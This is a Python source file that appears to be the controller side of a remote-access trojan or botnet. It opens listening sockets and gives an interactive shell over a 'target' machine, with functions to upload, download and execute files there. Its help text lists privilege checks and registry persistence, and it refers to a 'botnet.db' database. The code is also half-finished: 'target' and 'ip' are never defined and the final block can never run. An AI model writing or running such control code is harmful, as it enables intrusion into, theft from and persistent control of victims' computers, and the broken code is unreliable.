import socket
from xml.etree.ElementTree import Comment
import termcolor
import json
import os
import sqlite3
from sqlite3 import Error
from _thread import *

ServerSideSocket = socket.socket()
host = '127.0.0.1'
port = 2004
ThreadCount = 0
try:
    ServerSideSocket.bind((host, port))
except socket.error as e:
    print(str(e))
print('Socket is listening..')
ServerSideSocket.listen(5)

def multi_threaded_client(connection):
    connection.send(str.encode('Server is working:'))
    while True:
        data = connection.recv(2048)
        response = 'Server message: ' + data.decode('utf-8')
        if not data:
            break
        connection.sendall(str.encode(response))


def create_connection(db_file):
    """ create a database connection to a SQLite database """
    conn = None
    try:
        conn = sqlite3.connect(db_file)
        print(sqlite3.version)
    except Error as e:
        print(e)
    finally:
        if conn:
            conn.close()

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def execute_programm(path):
    path = input('path: ')
    target.send(f"{path}".encode())


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        if command == '':
            target_communication()
        reliable_send(command)
        if command == 'quit':
            pass
        elif command == 'clear':
            os.system('cls')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:7] == 'execute':
            execute_programm(command[8:])

        
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            check                               --> Check for admin privileges
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The Target Machine
            download *file name*                --> Download File From Target Machine
            execute *file name*                 --> Execute Program On Target Machine
            
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
        else:
            result = reliable_recv()
            print(result)


while True:
    Client, address = ServerSideSocket.accept()
    print('Connected to: ' + address[0] + ':' + str(address[1]))
    start_new_thread(multi_threaded_client, (Client, ))
    ThreadCount += 1
    print('Thread Number: ' + str(ThreadCount))


create_connection(r"C:\sqlite\sgui\db\botnet.db")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 4545))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
sock.listen(5)
sql = f'INSERT INTO IpUser (ip) values({ip})'
print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
target_communication()
